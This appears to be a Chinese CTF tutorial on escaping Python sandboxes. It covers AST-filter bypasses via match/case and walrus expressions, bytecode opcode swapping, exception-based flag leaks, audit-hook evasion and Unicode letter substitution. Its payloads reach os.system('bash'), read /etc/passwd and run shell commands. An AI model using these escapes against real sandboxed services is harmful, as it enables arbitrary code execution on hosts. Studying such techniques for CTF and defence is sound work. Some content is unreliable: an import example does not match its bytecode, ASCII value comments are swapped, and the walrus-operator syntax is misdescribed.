<pre><code class="highlight plaintext">class AClass:
    def __init__(self, value):
        self.thing = value

item = AClass(32)

match item:
    case AClass(thing=x):
        print(f&quot;Got &#123;x = &#125;!&quot;)

# Got x = 32!</code></pre>
<p>在这个示例中，重点关注<code>case AClass(thing=x)</code>，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 <code>AClass</code> 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。</p>
<p>这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 <code>''.__class__</code>，可以编写如下的 match/case 语句：</p>
<pre><code class="highlight plaintext">match str():
    case str(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>
<p>可以看到 x 就是 <code>''.__class__</code>. 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>
<p>再测试一下该 payload 的 AST：</p>
<pre><code class="highlight plaintext">import os
import ast 

a = &#x27;&#x27;&#x27;
match str():
    case str(__class__=x):
        print(x)
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))</code></pre>
<p>AST 如下：</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Match(
            subject=Call(
                func=Name(id=&#x27;str&#x27;, ctx=Load()),
                args=[],
                keywords=[]),
            cases=[
                match_case(
                    pattern=MatchClass(
                        cls=Name(id=&#x27;str&#x27;, ctx=Load()),
                        patterns=[],
                        kwd_attrs=[
                            &#x27;__class__&#x27;],
                        kwd_patterns=[
                            MatchAs(name=&#x27;x&#x27;)]),
                    body=[
                        Expr(
                            value=Call(
                                func=Name(id=&#x27;print&#x27;, ctx=Load()),
                                args=[
                                    Name(id=&#x27;x&#x27;, ctx=Load())],
                                keywords=[]))])])],
    type_ignores=[])</code></pre>
<p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p>
<p>我们可以构造替代 <code>''.__class__.__base__.__subclasses__()</code>的 payload：</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=clazz):
        match clazz:
            case object(__base__=bass):
                match bass:
                    case object(__subclasses__=subclazz):
                        print(subclazz)</code></pre>
<h4 id="绕过-astassign-赋值变量"><a class="markdownIt-Anchor" href="#绕过-astassign-赋值变量"></a> 绕过 ast.Assign 赋值变量</h4>
<p>ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
<pre><code class="highlight plaintext">[
    system:=111,
    bash:=222
]</code></pre>
<p>此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Expr(
            value=List(
                elts=[
                    NamedExpr(
                        target=Name(id=&#x27;system&#x27;, ctx=Store()),
                        value=Constant(value=111)),
                    NamedExpr(
                        target=Name(id=&#x27;bash&#x27;, ctx=Store()),
                        value=Constant(value=222))],
                ctx=Load()))],
    type_ignores=[])</code></pre>
<h4 id="绕过-astconstant-获取数字-字符串"><a class="markdownIt-Anchor" href="#绕过-astconstant-获取数字-字符串"></a> 绕过 ast.Constant 获取数字、字符串</h4>
<p>题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。 例如：</p>
<pre><code class="highlight plaintext">&quot;&quot; : str()
0  : len([])
&quot;0&quot;: str(len([]))
&quot;1&quot;: str(len([str()])) 或 str(len([min]))
&quot;2&quot;: str(len([str(),str()])) 或 str(len([min,max]))
&#x27;A&#x27;: chr(len([min,min,min,min,min])*len([min,min,min,min,min,min,min,min,min,min,min,min,min]))</code></pre>
<p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。</p>
<p>当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串，这种方式在我此前的博客：<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict">pyjail bypass-02 绕过基于字符串匹配的过滤</a> 中有提到过。</p>
<p>在这个 payload 中，需要构造出 _wrap_close、system、bash</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>
<p>那么就可以通过下面的方式获取到这几个字符串：</p>
<pre><code class="highlight plaintext">list(dict(system=[]))[0]            # system
list(dict(_wrap_close=[]))[0]       # _wrap_close
list(dict(bash=[]))[0]              # bash</code></pre>
<h4 id="绕过-astsubscript-获取列表字典元素"><a class="markdownIt-Anchor" href="#绕过-astsubscript-获取列表字典元素"></a> 绕过 ast.Subscript 获取列表/字典元素</h4>
<p>题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p>
<pre><code class="highlight plaintext">min(list(dict(system=[])))            # system
min(list(dict(_wrap_close=[])))       # _wrap_close
min(list(dict(bash=[])))              # bash</code></pre>
<p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match/case 来获取。</p>
<pre><code class="highlight plaintext">match globals:
    case object(get=get_func):
        get_func(&quot;system&quot;)</code></pre>
<h4 id="绕过-astfor-遍历列表"><a class="markdownIt-Anchor" href="#绕过-astfor-遍历列表"></a> 绕过 ast.For 遍历列表</h4>
<p>在构造最终 payload 中，我们还需要在 <code>__subclasses__()</code>得到的列表中获取到 _wrap_close 类。</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>
<p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：</p>
<pre><code class="highlight plaintext">def filter_func(subclazzes_item):
    [ _wrap_close:=min(list(dict(_wrap_close=[])))]
    match subclazzes_item:
        case object(_＿name_＿=name):
            if name==_wrap_close:
                return subclazzes_item
[
    subclazzes_item:=min(filter(filter_func,subclazzes()))
]</code></pre>
<p>fitler 中使用 match/case 和 if 来进行过滤。</p>
<p>除了使用 filter 函数外，还可以使用<code> iter</code> 和 <code>next</code> 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p>
<h4 id="绕过astgeneratorexp获取生成器栈帧"><a class="markdownIt-Anchor" href="#绕过astgeneratorexp获取生成器栈帧"></a> 绕过<code>ast.GeneratorExp</code>获取生成器栈帧</h4>
<p>思路来自于 [<a href="https://maplebacon.org/2024/02/dicectf2024-irs/">DiceCTF 2024] IRS</a></p>
<p>payload 如下，且 AST 中不会出现 <code>ast.GeneratorExp</code>。</p>
<pre><code class="highlight plaintext">def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame)</code></pre>
<p>如何理解这段代码：</p>
<ol>
<li>首先声明了一个生成器 f，
<ol>
<li>f 内部声明了全局变量 x 和 frame，意味着会在函数外部对其进行操作。</li>
</ol>
</li>
<li>x = f() 会实例化一个生成器，但由于生成器的延迟加载，此时生成器不会执行。</li>
<li>x.send(None)：这行代码启动了生成器，并让它执行到第一个 yield 语句。</li>
</ol>
<p>测试代码如下：</p>
<pre><code class="highlight plaintext">import ast

flag = &quot;flag&#123;12345&#125;&quot;
code = &#x27;&#x27;&#x27;
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame.f_globals)
&#x27;&#x27;&#x27;

print(ast.dump(ast.parse(code, mode=&#x27;exec&#x27;), indent=4))
root = ast.parse(code)
compiled_code = compile(code,&quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;)
# 又是一段严防死守的过滤
exec(
    compiled_code,
    None,   # globals，也可能是其他值
    None    # locals，也可能是其他值
)</code></pre>
<h3 id="opcode"><a class="markdownIt-Anchor" href="#opcode"></a> <code>OPcode</code></h3>
<p>见过pickle的大概都知道OPcode是个什么东西</p>
<blockquote>
<p>opcode又称为操作码，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。</p>
</blockquote>
<p>那么如何查看一个函数的opcode呢，写个例子看看先</p>
<pre><code class="highlight plaintext">import dis

code_str = &#x27;print(&quot;a&quot;)&#x27;
code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250704170021243.png" alt="image-20250704170021243"></p>
<h4 id="import_from-load_attr-相互替换"><a class="markdownIt-Anchor" href="#import_from-load_attr-相互替换"></a> IMPORT_FROM、LOAD_ATTR 相互替换</h4>
<p>思路来自于:</p>
<ul>
<li><a href="https://sekai.team/blog/lactf-2023/pycjail">LA CTF 2023 – Pycjail  Project SEKAI</a></li>
<li><a href="https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak">TI-1337 Plus CE: Abusing CPython internals  kmh’s blog</a></li>
</ul>
<p>LOAD_ATTR 可以和 IMPORT_FROM 直接替换。</p>
<h4 id="load_name-load_attr"><a class="markdownIt-Anchor" href="#load_name-load_attr"></a> LOAD_NAME &amp; LOAD_ATTR</h4>
<p>LOAD_ATTR 是用来从对象中获取属性的字节码指令。它通常用于从一个已经加载到栈上的对象（如模块或类实例）中获取某个属性。</p>
<p>例如导入 os.system 函数</p>
<pre><code class="highlight plaintext">import os
os.system</code></pre>
<p>对应的字节码如下，其中最为关键的就是 LOAD_NAME 和 LOAD_ATTR。</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (os)
              6 STORE_NAME               0 (os)

  3           8 LOAD_NAME                0 (os)
             10 LOAD_ATTR                1 (system)
             12 POP_TOP
             14 LOAD_CONST               1 (None)
             16 RETURN_VALUE

consts:  (0, None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c005a0065006a01010064015300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
5a00 -&gt; STORE_NAME, names[0] -&gt; os
6500 -&gt; LOAD_NAME, names[0] -&gt; os
6a01 -&gt; LOAD_ATTR, names[1] -&gt; system
0100 -&gt; POP_TOP
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>
<h4 id="import_name-import_from"><a class="markdownIt-Anchor" href="#import_name-import_from"></a> IMPORT_NAME &amp; IMPORT_FROM</h4>
<p>如果使用 from 来进行函数导入:</p>
<pre><code class="highlight plaintext">from os import sys</code></pre>
<p>得到的字节码信息如下，可以看到使用的是 IMPORT_NAME 和 IMPORT_FROM 组合</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 ((&#x27;system&#x27;,))
              4 IMPORT_NAME              0 (os)
              6 IMPORT_FROM              1 (system)
              8 STORE_NAME               1 (system)
             10 POP_TOP
             12 LOAD_CONST               2 (None)
             14 RETURN_VALUE

consts:  (0, (&#x27;system&#x27;,), None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c006d015a01010064025300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; (&#x27;system&#x27;,)
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
6d01 -&gt; IMPORT_FROM, names[1] -&gt; system
5a01 -&gt; STORE_NAME, arg -&gt; 1
0100 -&gt; POP_TOP
6402 -&gt; LOAD_CONST, consts[2] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>
<h4 id="替换字节码"><a class="markdownIt-Anchor" href="#替换字节码"></a> 替换字节码</h4>
<p>在 LACTF 2023 Pycjail 这道题的场景中，用户输入的 const、names、code 最终会替换到题目中的一个空函数中并执行。排除掉题目其他的过滤，大致的逻辑如下：</p>
<ol>
<li>填充 f 函数 co_consts、co_names、co_code</li>
<li>然后执行函数。</li>
</ol>
<p>测试代码如下：</p>
<pre><code class="highlight plaintext">def f():
    pass

f.__code__ = f.__code__.replace(
    co_stacksize=10,
    co_consts=(&quot;a&quot;, 139, &quot;system&quot;, &quot;dir&quot;),
    co_names=tuple(&quot;__class__,__base__,__subclasses__,__init__,__globals__&quot;.split(&quot;,&quot;)),
    co_code=bytes.fromhex(trans_bytes(&quot;64006a006a01a002a100640119006a036a046402190064038301010064045300&quot;)),
)


print(&quot;here goes!&quot;)
frame = inspect.currentframe()
p = print
r = repr
for k in list(frame.f_globals):
    if k not in (&quot;p&quot;, &quot;r&quot;, &quot;f&quot;):
        del frame.f_globals[k]

p(r(f()))</code></pre>
<p>我们可以使用下面的脚本来生成 payload，我本地的 <code>_wrap_close</code> 的索引为 139.</p>
<pre><code class="highlight plaintext">import dis
import inspect
from test_opcode_display import display_opcode_py310
code_str = &#x27;&#x27;&#x27;
&#x27;a&#x27;.__class__.__base__.__subclasses__()[139].__init__.__globals__[&#x27;system&#x27;](&#x27;dir&#x27;)
&#x27;&#x27;&#x27;

code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())

# 64006d006d01a002a100640119006d036d046402190064038301010064045300</code></pre>
<p>LOAD_ATTR 对应操作码 6a，IMPORT_FROM 对应字节码为 6d，当我将 6a 直接替换为 6d 时，居然能够正常执行！</p>
<h3 id="无回显"><a class="markdownIt-Anchor" href="#无回显"></a> 无回显</h3>
<p>在 Python 中使用 exec 函数执行代码时，默认情况下没有输出，如果想要再 exec 中打印结果，就需要在执行代码块时假如 print。</p>
<p>以<code> AmateursCTF</code> 2023 的一道题目为例，题目的源码如下：</p>
<pre><code class="highlight plaintext">#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input(&quot;Give code: &quot;))
            if &quot;flag&quot; in code or &quot;e&quot; in code or &quot;t&quot; in code or &quot;\\&quot; in code:
                raise ValueError(&quot;invalid input&quot;)
            exec(eval(code))
        except Exception as err:
            print(err)</code></pre>
<p>在这道题中，首先通过 ascii 将输入进行转化，使用 ascii 后，即使 unicode，也会被转化为 \u00xx 的形式。然后判断输入中是否出现了 flag、e、t、以及 \。这样的过滤条件基本将 unicode 绕过的方式给限制住了。过滤了 e 和 t， print、help 等输出函数也会被过滤， 而题目使用 exec 来执行 python 代码，因此除了绕过过滤之外，还需要考虑如何获取输出。</p>
<p>注意到这道题添加了一个异常处理，如果 exec 中出现错误，则会将错误信息打印出来，借助异常处理的输出，就可以将 Python 中的一些内部变量给带出来。</p>
<h4 id="利用异常处理"><a class="markdownIt-Anchor" href="#利用异常处理"></a> 利用异常处理</h4>
<p>作为客户端输入，结合当前读取变量的场景，python 中可利用的一些异常大多为：</p>
<ul>
<li><code>KeyError</code>（键错误）： 当访问字典中不存在的键时引发的错误。（用户输入的键名被应用使用）</li>
<li><code>FileNotFoundError</code>（文件未找到错误）： 在尝试打开不存在的文件时引发的错误。</li>
<li><code>ValueError</code>（值错误）： 当函数接收到正确类型的参数，但参数值不合适时引发的错误。</li>
</ul>
<p>这道题中 _ 与 flag 的值一致，因此我们只需要获取变量 _ 就可以获取 flag。</p>
<h5 id="keyerror"><a class="markdownIt-Anchor" href="#keyerror"></a> <code>KeyError</code></h5>
<p><code>KeyError</code> 出现在访问字典中不存在的键，利用时，可以随便构造一个字典，然后以需要读取的变量作为键名传进去。比如在这道题中输入：</p>
<pre><code class="highlight plaintext">Give code: &#123;&quot;1&quot;:&quot;2&quot;&#125;[_]
&#x27;flag&#123;xxxx&#125;&#x27;</code></pre>
<h5 id="filenotfounderror"><a class="markdownIt-Anchor" href="#filenotfounderror"></a> FileNotFoundError</h5>
<p><code>FileNotFoundError </code>出现在找不到指定文件时，将需要读取的变量名传入文件操作函数就可以触发异常。例如 file(python2)、open 等。</p>
<p>但由于题目过滤了 e，这些函数都无法使用，如果需要测试的话可以将过滤的语句删除掉。</p>
<pre><code class="highlight plaintext">Give code: open(_)
[Errno 2] No such file or directory: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>
<h5 id="valueerror"><a class="markdownIt-Anchor" href="#valueerror"></a> ValueError</h5>
<p><code>ValueError </code>比较好利用，只需要将需要读取的变量，传入一个函数，该函数的参数类型与这个要读取的变量不一致即可，例如：</p>
<pre><code class="highlight plaintext">Give code: int(_)
ValueError: invalid literal for int() with base 10: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>
<p>当然这里过滤了 t，int 函数无法使用，可以去寻找一些别的函数。</p>
<h5 id="popenreturncode"><a class="markdownIt-Anchor" href="#popenreturncode"></a> Popen.returncode</h5>
<p>在 aliyunCTF 2025 ezoj 这道题中，给出了一个使用 subprocess.Popen 执行 python 脚本，但无回显的情况，</p>
<pre><code class="highlight plaintext">process = subprocess.Popen(
    [&quot;python3&quot;, code_filename],
    stdin=infile,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)

try:
    stdout, stderr = process.communicate(timeout=5)
except subprocess.TimeoutExpired:
    process.kill()
    raise OJTimeLimitExceed

if process.returncode != 0:
    raise OJRuntimeError(process.returncode)</code></pre>
<p>但是题目给了一个 OJRuntimeError，并且传入了 returncode 属性。returncode 属性用于保存子进程退出时返回的退出码，反映了子进程是在正常结束还是在运行过程中出现异常。</p>
<p>这道题会将错误码发送给客户端：</p>
<pre><code class="highlight plaintext">except OJRuntimeError as e:
    return &#123;&quot;status&quot;: &quot;RE&quot;, &quot;message&quot;: f&quot;Runtime Error: ret=&#123;e.args[0]&#125;&quot;&#125;</code></pre>
<p><code>returncode</code> 的可能取值有以下几种</p>
<ul>
<li>None：表示子进程尚未终止，此时 returncode 还没有被赋值。</li>
<li>0：表示子进程成功结束，没有发生错误。</li>
<li>正整数：表示子进程执行时出现了错误，返回码通常会反映错误类型或状态码。</li>
<li>负整数：（仅在 POSIX 系统中）表示子进程被某个信号强制终止，其数值通常为 -N，其中 N 是引起终止的信号编号。</li>
</ul>
<p>由于 ascii 也是 0-255，借助这个 returncode 就可以实现回显，但 returncode 仅有一位，所以需要逐位回显。</p>
<pre><code class="highlight plaintext">import sys
...

content_len = len(content)
if &#123;loc&#125; &lt; content_len:
    sys.exit(content[&#123;loc&#125;])
else:
    sys.exit(255)</code></pre>
<h3 id="钩子爹来咯"><a class="markdownIt-Anchor" href="#钩子爹来咯"></a> 钩子爹来咯!</h3>
<p>钩子是什么?<s>钩子就是钩子啊</s></p>
<blockquote>
<p><strong>Audit Hook</strong>审计钩子是Python3.8开始引入的一项安全功能旨在让 Python 运行时的操作对外部监控工具可见。该功能允许开发者通过注册钩子函数来监控和控制特定的事件，尤其是与安全相关的操作。这种机制为系统管理员、测试人员和安全专家提供了一个有效的手段来检测、记录或阻止特定操作。</p>
<p>审计钩子通过 <code>sys.addaudithook()</code> 函数添加。每当发生特定事件时，Python会调用这些钩子函数，并将事件名称和相关参数传递给它们。钩子函数可以选择记录这些事件，或者在检测到不允许的操作时抛出异常，从而阻止操作继续进行。</p>
</blockquote>
<p>而发生审计事件时，Python就会调用这些钩子</p>
<p>Python 中的审计事件包括但不限于以下几类：</p>
<ul>
<li><code>import</code>：发生在导入模块时。</li>
<li><code>open</code>：发生在打开文件时。</li>
<li><code>write</code>：发生在写入文件时。</li>
<li><code>exec</code>：发生在执行Python代码时。</li>
<li><code>compile</code>：发生在编译Python代码时。</li>
<li><code>socket</code>：发生在创建或使用网络套接字时。</li>
<li><code>os.system</code>，<code>os.popen</code>等：发生在执行操作系统命令时。</li>
<li><code>subprocess.Popen</code>，<code>subprocess.run</code>等：发生在启动子进程时</li>
</ul>
<p>所有的事件列表可见：</p>
<ul>
<li><a href="https://docs.python.org/3/library/audit_events.html">Audit events table — Python 3.13.0 documentation</a></li>
<li><a href="https://peps.python.org/pep-0578/">PEP 578 – Python Runtime Audit Hooks</a></li>
</ul>
<p>你可以定义一个函数</p>
<pre><code class="highlight plaintext">def waf(event,args):
	if not event in [&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:
		raise Exception(&quot;Errror&quot;)
sys.addaudithook(waf)</code></pre>
<p>接着之后的代码一旦不在白名单内就会<code>raise Exception</code></p>
<h4 id="篡改内置函数"><a class="markdownIt-Anchor" href="#篡改内置函数"></a> 篡改内置函数</h4>
<h3 id="乱七八糟的waf"><a class="markdownIt-Anchor" href="#乱七八糟的waf"></a> 乱七八糟的WAF</h3>
<h4 id="过滤import"><a class="markdownIt-Anchor" href="#过滤import"></a> 过滤import</h4>
<p><strong><code>__import__</code></strong></p>
<p>除了可以使用 import，还可以使用 <code>__import__</code>和 <code>importlib.import_module</code>来导入模块<br>
<code>importlib </code>需要进行导入后才能够使用</p>
<p>还可以使用<code>execfile</code></p>
<pre><code class="highlight python"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)
importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)

<span class="comment">#py2</span>
execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)

<span class="comment">#py3</span>
<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
    <span class="built_in">exec</span>(f.read())
    <span class="comment">#这个是需要事先知道路径的，要用sys.path(if)去事先试探一下</span></code></pre>
<p><strong><code>__loader__</code></strong></p>
<p><code>__loader__.load_module</code>底层实现与 import 不同, 可以绕过audithook</p>
<pre><code class="highlight plaintext">__loader__.load_module(&#x27;os&#x27;)</code></pre>
<h4 id="过滤字母"><a class="markdownIt-Anchor" href="#过滤字母"></a> 过滤字母</h4>
<p>可以用全角字符绕过半角字符</p>
<pre><code class="highlight plaintext">def halfwidth_to_fullwidth(text):
    &quot;&quot;&quot;将半角字符转换为全角字符&quot;&quot;&quot;
    result = []
    for char in text:
        code = ord(char)
        if code == 0x20:  # 半角空格 → 全角空格
            result.append(&#x27;\u3000&#x27;)
        elif 0x21 &lt;= code &lt;= 0x7E:  # 可打印ASCII字符 → 全角字符
            result.append(chr(code + 0xFEE0))
        else:  # 其他字符保持不变
            result.append(char)
    return &#x27;&#x27;.join(result)

# 目标字符串
target_string = &quot;eval&quot;

# 转换并直接打印结果
print(halfwidth_to_fullwidth(target_string))</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703093113593.png" alt="image-20250703093113593"></p>
<p>可以看到绕过成功</p>
<p>还有一种方法也可以绕过，利用特殊的Unicode字符</p>
<pre><code class="highlight plaintext">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗
𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻 
𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</code></pre>
<pre><code class="highlight plaintext">#coding=utf-8
def convert_to_math_sans_italic(text):
    result = []
    for char in text:
        code = ord(char)
        if 0x30 &lt;= code &lt;= 0x39:
            result.append(chr(code - 0x30 + 0x1D7EC))
        elif 0x61 &lt;= code &lt;= 0x7A:
            result.append(chr(code - 0x61 + 0x1D622))
        elif 0x41 &lt;= code &lt;= 0x5A:
            result.append(chr(code - 0x41 + 0x1D608))
        else:
            result.append(char)
    return &#x27;&#x27;.join(result)

if __name__ == &quot;__main__&quot;:
    original = &quot;eval&quot;
    converted = convert_to_math_sans_italic(original)
    print(&quot;原始字符串:&quot;, original)
    print(&quot;转换结果: &quot;, converted)</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094342023.png" alt="image-20250703094342023"></p>
<p>可以看到也绕过成功了</p>
<p>但是要注意的是放在语句中时绝对不能用全角字符作开头，会褒姒</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094649462.png" alt="image-20250703094649462"></p>
<h4 id="过滤属性"><a class="markdownIt-Anchor" href="#过滤属性"></a> 过滤属性</h4>
<p>利用一下<code>getattr</code>这个函数</p>
<p>功能其实就是获取类的某个属性值</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; getattr(os,&#x27;system&#x27;)(&#x27;cat /etc/passwd&#x27;)
root:x:0:0:root:/root:/usr/bin/zsh</code></pre>
<p>也可以用<code>__getattribute__</code>方法替换</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; os.__getattribute__(&#x27;system&#x27;)
&lt;built-in function system&gt;</code></pre>
<p>还可以用<code>__getattr</code>__</p>
<pre><code class="highlight plaintext">这是一个魔术方法</code></pre>
<h4 id="行数限制"><a class="markdownIt-Anchor" href="#行数限制"></a> 行数限制</h4>
<p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用,例如 eval, 中间如果存在；或者换行会报错。</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;__import__(&#x27;os&#x27;);print(1)&quot;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;&lt;string&gt;&quot;, line 1
    __import__(&#x27;os&#x27;);print(1)</code></pre>
<h5 id="exec"><a class="markdownIt-Anchor" href="#exec"></a> exec</h5>
<p>exec 可以支持换行符与<code>;</code></p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;)
1</code></pre>
<h5 id="compile"><a class="markdownIt-Anchor" href="#compile"></a> compile</h5>
<p>compile 在 single 模式下也同样可以使用 \n 进行换行, 在 exec 模式下可以直接执行多行代码.</p>
<pre><code class="highlight plaintext">eval(&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;)</code></pre>
<h5 id="海象表达式"><a class="markdownIt-Anchor" href="#海象表达式"></a> 海象表达式</h5>
<p>海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</p>
<p>海象表达式的语法形式如下：</p>
<pre><code class="highlight plaintext">&lt;expression&gt; := &lt;value&gt; if &lt;condition&gt; else &lt;value&gt;</code></pre>
<p>借助海象表达式，我们可以通过列表来替代多行代码：</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;)
uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
[&lt;module &#x27;os&#x27; (frozen)&gt;, 0]</code></pre>
<h4 id="长度限制"><a class="markdownIt-Anchor" href="#长度限制"></a> 长度限制</h4>
<p>BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>
<p>题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</p>
<pre><code class="highlight plaintext">print(open(bytes([102,108,97,103,46,116,120,116])).read())</code></pre>
<p>函数名比较好绕过，直接使用 unicode。数字也可以使用 ord 来获取然后进行相减。我这里选择的是 chr(333).</p>
<pre><code class="highlight plaintext"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)
# a = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)
# l = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)
# g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)
# . = 46 = 333-287 = ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;)
# t = 116 = 333-217 = ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)
# x = 120 = = 333-213 = ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;)

